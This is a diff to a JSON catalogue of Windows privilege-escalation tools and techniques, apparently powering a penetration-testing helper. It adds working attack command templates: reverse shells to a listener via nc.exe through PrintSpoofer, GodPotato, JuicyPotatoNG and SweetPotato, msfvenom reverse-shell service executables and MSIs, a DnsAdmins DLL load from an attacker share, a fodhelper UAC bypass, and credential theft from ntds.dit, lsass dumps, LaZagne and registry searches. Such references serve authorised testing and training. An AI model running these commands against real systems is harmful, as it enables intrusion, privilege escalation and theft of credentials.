@@ -1,8 +1,8 @@
 {
   "tools": [
     { "name": "winpeas", "description": "All-in-one Windows local privesc enumeration (exe and ps1 editions)", "commands": [
-      { "purpose": "Download and run the x64 binary", "template": "curl http://{{LHOST}}:{{LPORT}}/winPEASx64.exe -o w.exe & w.exe", "intent": "enumerate" },
-      { "purpose": "Run the PowerShell edition", "template": "iwr http://{{LHOST}}:{{LPORT}}/winPEAS.ps1 -OutFile w.ps1; .\\w.ps1", "intent": "enumerate" }
+      { "purpose": "Download and run the x64 binary", "template": "curl http://{{LHOST}}/winPEASx64.exe -o w.exe & w.exe", "intent": "enumerate" },
+      { "purpose": "Run the PowerShell edition", "template": "iwr http://{{LHOST}}/winPEAS.ps1 -OutFile w.ps1; .\\w.ps1", "intent": "enumerate" }
     ] },
     { "name": "PowerUp", "description": "PowerSploit module that checks common Windows privesc misconfigs", "commands": [
       { "purpose": "Run every built-in check", "template": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "intent": "enumerate" }
@@ -14,16 +14,19 @@
       { "purpose": "Run all host-survey checks", "template": "Seatbelt.exe -group=all", "intent": "enumerate" }
     ] },
     { "name": "PrintSpoofer", "description": "Abuses SeImpersonate via the print spooler named pipe", "commands": [
-      { "purpose": "Spawn a SYSTEM shell (2016/2019/Win10)", "template": "PrintSpoofer64.exe -i -c cmd", "intent": "exploit" }
+      { "purpose": "Spawn a SYSTEM shell (2016/2019/Win10)", "template": "PrintSpoofer64.exe -i -c cmd", "intent": "exploit" },
+      { "purpose": "From a reverse shell (-i needs a console): SYSTEM shell to your listener", "template": "PrintSpoofer64.exe -c \"C:\\Windows\\Temp\\nc.exe {{LHOST}} {{LPORT}} -e cmd\"", "intent": "exploit" }
     ] },
     { "name": "GodPotato", "description": "SeImpersonate abuse that works across 2012-2022 (needs .NET)", "commands": [
-      { "purpose": "Run a command as SYSTEM", "template": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"", "intent": "exploit" }
+      { "purpose": "Run a command as SYSTEM", "template": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"", "intent": "exploit" },
+      { "purpose": "SYSTEM shell to your listener", "template": "GodPotato-NET4.exe -cmd \"C:\\Windows\\Temp\\nc.exe {{LHOST}} {{LPORT}} -e cmd\"", "intent": "exploit" }
     ] },
     { "name": "robocopy", "description": "Built-in copy tool that honours backup semantics", "commands": [
-      { "purpose": "Copy locked hives with SeBackupPrivilege", "template": "robocopy /b C:\\Windows\\System32\\config . SAM SYSTEM", "intent": "dump" }
+      { "purpose": "Copy ntds.dit off the shadow copy with backup semantics", "template": "robocopy /b z:\\Windows\\NTDS . ntds.dit", "intent": "dump" }
     ] },
     { "name": "diskshadow", "description": "Built-in shadow-copy tool to read locked files", "commands": [
-      { "purpose": "Run a shadow-copy script to expose C:", "template": "diskshadow /s script.txt", "intent": "dump" }
+      { "purpose": "Write the diskshadow script (PowerShell, one line per command)", "template": "Set-Content C:\\Windows\\Temp\\ds.txt \"set context persistent nowriters\",\"add volume c: alias slg\",\"create\",\"expose %slg% z:\"", "intent": "transfer" },
+      { "purpose": "Run a shadow-copy script to expose C:", "template": "diskshadow /s C:\\Windows\\Temp\\ds.txt", "intent": "dump" }
     ] },
     { "name": "reg", "description": "Built-in registry editor for queries and hive exports", "commands": [
       { "purpose": "Check the AlwaysInstallElevated keys", "template": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "intent": "enumerate" },
@@ -139,7 +142,25 @@
     ] },
     { "name": "evil-winrm", "description": "WinRM shell supporting passwords, hashes and tickets", "commands": [
       { "purpose": "Kerberos login with the ticket in KRB5CCNAME (needs /etc/krb5.conf)", "template": "evil-winrm -i <host> -r <domain>", "intent": "authenticate" }
-    ] }
+    ] },
+    { "name": "JuicyPotato", "description": "SeImpersonate abuse through a COM server CLSID; Server 2008–2016 / Win10 before 1809.", "commands": [
+      { "purpose": "Run your binary as SYSTEM (pick a CLSID for the OS from the JuicyPotato list)", "template": "JuicyPotato.exe -l 1337 -p C:\\Windows\\Temp\\<file>.exe -t * -c {<clsid>}", "intent": "exploit" }
+    ]},
+    { "name": "JuicyPotatoNG", "description": "JuicyPotato rebuilt for Windows 10 1809+ and Server 2019+.", "commands": [
+      { "purpose": "SYSTEM shell to your listener", "template": "JuicyPotatoNG.exe -t * -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Windows\\Temp\\nc.exe {{LHOST}} {{LPORT}} -e cmd\"", "intent": "exploit" }
+    ]},
+    { "name": "SweetPotato", "description": "Tries several SeImpersonate techniques (PrintSpoofer, EfsRpc, WinRM) in one binary.", "commands": [
+      { "purpose": "SYSTEM shell to your listener", "template": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c C:\\Windows\\Temp\\nc.exe {{LHOST}} {{LPORT}} -e cmd\"", "intent": "exploit" }
+    ]},
+    { "name": "LaZagne", "description": "Recovers saved passwords from browsers, mail, Wi-Fi, databases and the vault.", "commands": [
+      { "purpose": "Dump every saved password it can find", "template": ".\\LaZagne.exe all", "intent": "dump" }
+    ]},
+    { "name": "pypykatz", "description": "Mimikatz in Python: parses an lsass dump on Kali.", "commands": [
+      { "purpose": "Read logon passwords and hashes from a procdump of lsass", "template": "pypykatz lsa minidump lsass.dmp", "intent": "dump" }
+    ]},
+    { "name": "PsExec", "description": "Sysinternals PsExec: runs a process on another host from a Windows shell.", "commands": [
+      { "purpose": "Shell on another host with credentials", "template": ".\\PsExec64.exe -accepteula -i \\\\<host> -u <domain>\\<user> -p <pass> cmd", "intent": "authenticate" }
+    ]}
   ],
   "techniques": [
     { "name": "Map the host and your privileges", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": [], "when": "First thing after a shell: learn who you are, what privileges your token holds and how the box is built.", "tools": [], "commands": [
@@ -147,37 +168,52 @@
       { "purpose": "List token privileges (SeImpersonate etc.)", "template": "whoami /priv", "intent": "enumerate" },
       { "purpose": "Fingerprint OS, build and hotfixes", "template": "systeminfo", "intent": "enumerate" },
       { "purpose": "Show local admins and your user", "template": "net localgroup administrators & net user <user>", "intent": "enumerate" },
-      { "purpose": "Check NICs, PowerShell version and architecture", "template": "ipconfig /all & echo %PROCESSOR_ARCHITECTURE% & powershell -c $PSVersionTable.PSVersion", "intent": "enumerate" }
+      { "purpose": "Check NICs, PowerShell version and architecture", "template": "ipconfig /all & echo %PROCESSOR_ARCHITECTURE% & powershell -c $PSVersionTable.PSVersion", "intent": "enumerate" },
+      { "purpose": "Ports listening only on localhost are internal services to reach", "template": "netstat -ano | findstr LISTENING", "intent": "enumerate" },
+      { "purpose": "Running processes and the services inside them", "template": "tasklist /svc", "intent": "enumerate" },
+      { "purpose": "Installed 32-bit software and versions (drop Wow6432Node for 64-bit)", "template": "Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | select DisplayName,DisplayVersion", "intent": "enumerate" }
     ] },
     { "name": "Enumerate privesc paths automatically", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": [], "when": "You want a fast, broad sweep of misconfigs before hand-checking anything; read winPEAS red/yellow first, then confirm each hit.", "tools": ["winpeas", "PowerUp", "PrivescCheck", "Seatbelt"], "commands": [
-      { "purpose": "Download and run winPEAS", "template": "curl http://{{LHOST}}:{{LPORT}}/winPEASx64.exe -o w.exe & w.exe", "intent": "enumerate" },
+      { "purpose": "Download and run winPEAS", "template": "curl http://{{LHOST}}/winPEASx64.exe -o w.exe & w.exe", "intent": "enumerate" },
       { "purpose": "Run PowerUp's full check set", "template": "powershell -ep bypass -c \"Import-Module .\\PowerUp.ps1; Invoke-AllChecks\"", "intent": "enumerate" },
       { "purpose": "Deep-check with PrivescCheck", "template": "powershell -ep bypass -c \". .\\PrivescCheck.ps1; Invoke-PrivescCheck -Extended\"", "intent": "enumerate" }
     ] },
-    { "name": "Get SYSTEM by abusing SeImpersonate", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common on service accounts and IIS/MSSQL).", "tools": ["PrintSpoofer", "GodPotato"], "commands": [
+    { "name": "Get SYSTEM by abusing SeImpersonate", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege (common on service accounts and IIS/MSSQL).", "tools": ["PrintSpoofer", "GodPotato", "JuicyPotato", "JuicyPotatoNG", "SweetPotato"], "commands": [
       { "purpose": "PrintSpoofer for 2016/2019/Win10", "template": "PrintSpoofer64.exe -i -c cmd", "intent": "exploit" },
       { "purpose": "GodPotato for 2012-2022 when PrintSpoofer fails", "template": "GodPotato-NET4.exe -cmd \"cmd /c whoami\"", "intent": "exploit" }
     ] },
     { "name": "Read SAM and SYSTEM with SeBackupPrivilege", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["hash"], "when": "Your token has SeBackupPrivilege, which lets you read any file; grab the credential hives and parse them offline.", "tools": ["diskshadow", "robocopy", "reg", "impacket-secretsdump"], "commands": [
-      { "purpose": "Snapshot C: with diskshadow then copy hives", "template": "diskshadow /s script.txt", "intent": "dump" },
-      { "purpose": "Copy locked hives with backup semantics", "template": "robocopy /b C:\\Windows\\System32\\config . SAM SYSTEM", "intent": "dump" },
+      { "purpose": "Write the diskshadow script (PowerShell, one line per command)", "template": "Set-Content C:\\Windows\\Temp\\ds.txt \"set context persistent nowriters\",\"add volume c: alias slg\",\"create\",\"expose %slg% z:\"", "intent": "transfer" },
+      { "purpose": "Expose a shadow copy of C: as z:", "template": "diskshadow /s C:\\Windows\\Temp\\ds.txt", "intent": "dump" },
+      { "purpose": "On a DC: copy ntds.dit off the shadow copy (then secretsdump -ntds with system.save)", "template": "robocopy /b z:\\Windows\\NTDS . ntds.dit", "intent": "dump" },
       { "purpose": "Or export the live hives", "template": "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save", "intent": "dump" },
       { "purpose": "Extract local hashes offline", "template": "impacket-secretsdump -sam sam.save -system system.save LOCAL", "intent": "dump" }
     ] },
-    { "name": "Abuse a dangerous token privilege", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeRestore, SeTakeOwnership, SeLoadDriver, SeDebug or SeManageVolume; each is a note-level path to SYSTEM.", "tools": ["icacls"], "commands": [
-      { "purpose": "Take ownership/rewrite a SYSTEM binary", "template": "icacls <file> /grant <user>:F", "intent": "exploit" }
+    { "name": "Abuse a dangerous token privilege", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /priv shows SeRestore, SeTakeOwnership, SeLoadDriver, SeDebug or SeManageVolume; each is a note-level path to SYSTEM.", "tools": ["icacls", "procdump"], "commands": [
+      { "purpose": "Take ownership/rewrite a SYSTEM binary", "template": "icacls <file> /grant <user>:F", "intent": "exploit" },
+      { "purpose": "SeTakeOwnership: own the file, then icacls grants you full control", "template": "takeown /f <file>", "intent": "exploit" }
+    ] },
+    { "name": "Abuse a privileged built-in group", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "whoami /groups shows Backup Operators, Server Operators, DnsAdmins or AD Recycle Bin: each one is a short path to SYSTEM or old secrets.", "tools": ["impacket-reg", "sc"], "commands": [
+      { "purpose": "Which privileged groups you are in", "template": "whoami /groups", "intent": "enumerate" },
+      { "purpose": "Server Operators: point a SYSTEM service at your command", "template": "sc config <service> binPath= \"<command>\" & sc stop <service> & sc start <service>", "intent": "exploit" },
+      { "purpose": "DnsAdmins: load your DLL into the DNS service", "template": "dnscmd <host> /config /serverlevelplugindll \\\\{{LHOST}}\\share\\<file>.dll", "intent": "exploit" },
+      { "purpose": "DnsAdmins: restart DNS to load it as SYSTEM", "template": "sc.exe \\\\<host> stop dns & sc.exe \\\\<host> start dns", "intent": "exploit" },
+      { "purpose": "AD Recycle Bin: read deleted users for old passwords in their attributes", "template": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *", "intent": "dump" }
     ] },
     { "name": "Hijack an unquoted service path", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "A service runs an unquoted path containing spaces and you can write to an earlier segment; Windows will run your C:\\Program.exe first.", "tools": ["sc", "icacls"], "commands": [
       { "purpose": "List service binary paths", "template": "wmic service get name,displayname,pathname,startmode", "intent": "enumerate" },
+      { "purpose": "PowerShell: unquoted paths with spaces (no wmic on Win11 24H2 / Server 2025)", "template": "Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^\"' -and $_.PathName -match ' ' } | select Name,PathName,StartMode", "intent": "enumerate" },
       { "purpose": "Check write access on an intermediate folder", "template": "icacls \"C:\\Program Files\\<file>\"", "intent": "enumerate" },
       { "purpose": "Confirm the service account", "template": "sc qc <service>", "intent": "enumerate" }
     ] },
     { "name": "Replace a weak service binary", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You have write access to the exe of a service that runs as SYSTEM; swap it and restart the service.", "tools": ["icacls", "sc"], "commands": [
       { "purpose": "Check write access on the service exe", "template": "icacls \"C:\\Path\\service.exe\"", "intent": "enumerate" },
+      { "purpose": "On Kali: a service exe (a plain exe is killed by the SCM after 30 s)", "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe-service -o svc.exe", "intent": "exploit" },
       { "purpose": "Replace the binary and restart", "template": "sc stop <service> & copy /y svc.exe \"C:\\Path\\service.exe\" & sc start <service>", "intent": "exploit" }
     ] },
     { "name": "Reconfigure a service with weak permissions", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You hold SERVICE_CHANGE_CONFIG on a LocalSystem service; rewrite its binPath to run your command.", "tools": ["accesschk", "sc"], "commands": [
       { "purpose": "Find services the user can modify", "template": "accesschk.exe -accepteula -uwcqv <user> *", "intent": "enumerate" },
+      { "purpose": "On Kali: a service exe (a plain exe is killed by the SCM after 30 s)", "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f exe-service -o svc.exe", "intent": "exploit" },
       { "purpose": "Point binPath at your binary and restart", "template": "sc config <service> binPath= \"C:\\Temp\\svc.exe\" & sc stop <service> & sc start <service>", "intent": "exploit" }
     ] },
     { "name": "Hijack a service DLL or its registry key", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "A SYSTEM service has a writable registry key (ImagePath/Parameters) or loads a missing DLL from a writable directory.", "tools": ["accesschk", "icacls", "reg"], "commands": [
@@ -190,7 +226,8 @@
     ] },
     { "name": "Install an MSI as SYSTEM via AlwaysInstallElevated", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "Both AlwaysInstallElevated keys are set to 1, so any MSI installs with SYSTEM rights.", "tools": ["reg"], "commands": [
       { "purpose": "Check both keys (both must be 1)", "template": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated & reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated", "intent": "enumerate" },
-      { "purpose": "Install a crafted MSI (built with msfvenom, note)", "template": "msiexec /quiet /qn /i evil.msi", "intent": "exploit" }
+      { "purpose": "On Kali: build the MSI", "template": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{LHOST}} LPORT={{LPORT}} -f msi -o evil.msi", "intent": "exploit" },
+      { "purpose": "Install it as SYSTEM", "template": "msiexec /quiet /qn /i evil.msi", "intent": "exploit" }
     ] },
     { "name": "Run as another user with found or saved credentials", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "You found a password for another local or domain user, or cmdkey /list shows saved ones, and need a process running as them.", "tools": ["cmdkey","runas","RunasCs"], "commands": [
       { "purpose": "List stored credentials", "template": "cmdkey /list", "intent": "dump" },
@@ -200,14 +237,23 @@
       { "purpose": "Machine PATH folders", "template": "reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" /v Path", "intent": "enumerate" },
       { "purpose": "Check each folder: (F), (M) or (W) for you, Users or Everyone means writable", "template": "icacls \"<path>\"", "intent": "enumerate" }
     ] },
-    { "name": "Hunt stored credentials on disk and registry", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["creds"], "when": "You want quick wins from leftover secrets in config files, answer files, history and the registry.", "tools": ["findstr", "reg"], "commands": [
+    { "name": "Hunt stored credentials on disk and registry", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["creds"], "when": "You want quick wins from leftover secrets in config files, answer files, history and the registry.", "tools": ["findstr", "reg", "LaZagne"], "commands": [
       { "purpose": "Grep config files for passwords", "template": "findstr /sim password *.xml *.ini *.config *.txt", "intent": "dump" },
       { "purpose": "Check unattend/sysprep answer files", "template": "type C:\\Windows\\Panther\\Unattend.xml", "intent": "dump" },
       { "purpose": "Read PowerShell history", "template": "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt", "intent": "dump" },
-      { "purpose": "Check registry autologon (also Vault, RDP, Putty, Credential Manager)", "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "intent": "dump" }
+      { "purpose": "Check registry autologon (also Vault, RDP, Putty, Credential Manager)", "template": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"", "intent": "dump" },
+      { "purpose": "Saved PuTTY sessions (proxy passwords, hosts)", "template": "reg query HKCU\\Software\\SimonTatham\\PuTTY\\Sessions /s", "intent": "dump" },
+      { "purpose": "Every registry value containing password", "template": "reg query HKLM /f password /t REG_SZ /s", "intent": "dump" },
+      { "purpose": "PowerShell history of this session and the file on disk", "template": "Get-History; (Get-PSReadlineOption).HistorySavePath", "intent": "dump" },
+      { "purpose": "Documents and KeePass files in every profile you can read", "template": "Get-ChildItem -Path C:\\Users -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx -File -Recurse -ErrorAction SilentlyContinue", "intent": "dump" },
+      { "purpose": "Unattended install files with admin passwords", "template": "dir /s /b C:\\Windows\\Panther\\*.xml C:\\Windows\\System32\\sysprep\\*.xml", "intent": "dump" }
+    ] },
+    { "name": "Decrypt DPAPI-protected credentials", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell", "creds"], "yields": ["creds"], "when": "Saved RDP, browser or vault credentials sit under the user's profile: with the user's password, decrypt them offline.", "tools": ["impacket-dpapi", "mimikatz"], "commands": [
+      { "purpose": "Find the credential files and the master keys to download", "template": "Get-ChildItem -Force C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Credentials\\,C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Protect\\", "intent": "enumerate" }
     ] },
     { "name": "Bypass UAC for a full admin token", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "Note: only when your user is already in the local admins group but running at medium integrity; fodhelper is the classic auto-elevate target to reach high integrity.", "tools": [], "commands": [
-      { "purpose": "Check your integrity/UAC level first", "template": "whoami /groups | findstr /i \"Label\"", "intent": "enumerate" }
+      { "purpose": "Check your integrity/UAC level first", "template": "whoami /groups | findstr /i \"Label\"", "intent": "enumerate" },
+      { "purpose": "fodhelper: medium-integrity admin to high integrity (UAC not set to Always notify)", "template": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"<command>\" /f & reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /v DelegateExecute /t REG_SZ /f & fodhelper.exe", "intent": "exploit" }
     ] },
     { "name": "Hijack an autorun or startup-folder binary", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["shell"], "yields": ["admin"], "when": "An autorun entry or startup-folder item points at a binary you can overwrite and runs as an admin at logon.", "tools": ["reg", "icacls"], "commands": [
       { "purpose": "List autorun programs", "template": "reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "intent": "enumerate" },
@@ -217,7 +263,7 @@
       { "purpose": "Save systeminfo and suggest patches", "template": "systeminfo > systeminfo.txt & wes.py systeminfo.txt", "intent": "enumerate" },
       { "purpose": "Update the WES database first", "template": "wes.py --update", "intent": "tune" }
     ] },
-    { "name": "Dump local secrets once you are admin", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["admin"], "yields": ["hash"], "when": "You just got SYSTEM/admin and want local hashes, cached domain creds and LSA secrets for reuse.", "tools": ["reg", "impacket-secretsdump", "mimikatz", "procdump"], "commands": [
+    { "name": "Dump local secrets once you are admin", "phase": "PrivEsc", "service": "shell", "applies": "windows", "needs": ["admin"], "yields": ["hash"], "when": "You just got SYSTEM/admin and want local hashes, cached domain creds and LSA secrets for reuse.", "tools": ["reg", "impacket-secretsdump", "mimikatz", "procdump", "pypykatz"], "commands": [
       { "purpose": "Save all three hives", "template": "reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save & reg save HKLM\\SECURITY security.save", "intent": "dump" },
       { "purpose": "Parse them offline", "template": "impacket-secretsdump -sam sam.save -system system.save -security security.save LOCAL", "intent": "dump" },
       { "purpose": "Or pull live creds with mimikatz", "template": "privilege::debug sekurlsa::logonpasswords", "intent": "dump" },
